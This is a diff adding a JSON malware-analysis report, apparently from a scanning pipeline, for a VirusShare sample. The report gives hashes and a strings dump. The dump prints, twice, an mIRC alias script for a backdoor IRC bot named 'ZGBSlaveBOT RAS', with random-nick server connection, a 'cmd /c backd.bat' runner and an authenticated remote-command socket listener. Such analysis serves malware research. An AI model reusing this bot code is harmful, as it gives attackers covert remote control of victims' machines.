@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "[aliases]\nn0=/op /mode # +ooo $$1 $2 $3\nn1=/dop /mode # -ooo $$1 $2 $3\nn2=/j /join #$$1 $2-\nn3=/p /part #\nn4=/n /names #$$1\nn5=/w /whois $$1\nn6=/k /kick # $$1 $2-\nn7=/q /query $$1\nn8=/send /dcc send $1 $2\nn9=/chat /dcc chat $1\nn10=/ping /ctcp $$1 ping\nn11=/s /server $$1-\nn12=/rnick { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $r(1,99) }\nn13=/rident { /identd off\nn14=/identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $r(1,99) }\nn15=/servcon { \nn16=  //rnick\nn17=  //rident\nn18=  //server %irchost \nn19=}\nn20=/backd { //run cmd /c backd.bat }\nn21=/tlntvok {\nn22=  sockwrite tlntclient You recognized. $crlf\nn23=  sockwrite tlntclient Welcome to ZGBSlaveBOT RAS. $crlf\nn24=  sockwrite tlntclient BOT Version is - %version $crlf\nn25=  sockwrite tlntclient This is $host $crlf\nn26=  sockwrite tlntclient Awaiting commands... $crlf\nn27=  set %auth yes\nn28=}\nn29=\nn30=/tlntvfailure {\nn31=  sockwrite tlntclient Validation failure. $crlf\nn32=  set %auth no \nn33=  sockclose tlntserv \nn34=  sockclose tlntclient\nn35=  socklisten tlntserv %tlntport \nn36=}"
+    },
+    "filename": "VirusShare_23e06c9bba6e6e2c82568698c02152de",
+    "filesize": 1151,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "23e06c9bba6e6e2c82568698c02152de",
+        "sha1": "9c151154d31eae3bc094928ac869efb3fb9c6526",
+        "sha256": "c41cbc61fbc05b4d50981cee058b6158bade8663c52e87bbf0525b429e3ad048"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[aliases]",
+            "n0=/op /mode # +ooo $$1 $2 $3",
+            "n1=/dop /mode # -ooo $$1 $2 $3",
+            "n2=/j /join #$$1 $2-",
+            "n3=/p /part #",
+            "n4=/n /names #$$1",
+            "n5=/w /whois $$1",
+            "n6=/k /kick # $$1 $2-",
+            "n7=/q /query $$1",
+            "n8=/send /dcc send $1 $2",
+            "n9=/chat /dcc chat $1",
+            "n10=/ping /ctcp $$1 ping",
+            "n11=/s /server $$1-",
+            "n12=/rnick { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $r(1,99) }",
+            "n13=/rident { /identd off",
+            "n14=/identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $r(1,99) }",
+            "n15=/servcon { ",
+            "n16=  //rnick",
+            "n17=  //rident",
+            "n18=  //server %irchost ",
+            "n19=}",
+            "n20=/backd { //run cmd /c backd.bat }",
+            "n21=/tlntvok {",
+            "n22=  sockwrite tlntclient You recognized. $crlf",
+            "n23=  sockwrite tlntclient Welcome to ZGBSlaveBOT RAS. $crlf",
+            "n24=  sockwrite tlntclient BOT Version is - %version $crlf",
+            "n25=  sockwrite tlntclient This is $host $crlf",
+            "n26=  sockwrite tlntclient Awaiting commands... $crlf",
+            "n27=  set %auth yes",
+            "n28=}",
+            "n29=",
+            "n30=/tlntvfailure {",
+            "n31=  sockwrite tlntclient Validation failure. $crlf",
+            "n32=  set %auth no ",
+            "n33=  sockclose tlntserv ",
+            "n34=  sockclose tlntclient",
+            "n35=  socklisten tlntserv %tlntport ",
+            "n36=}"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265130",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
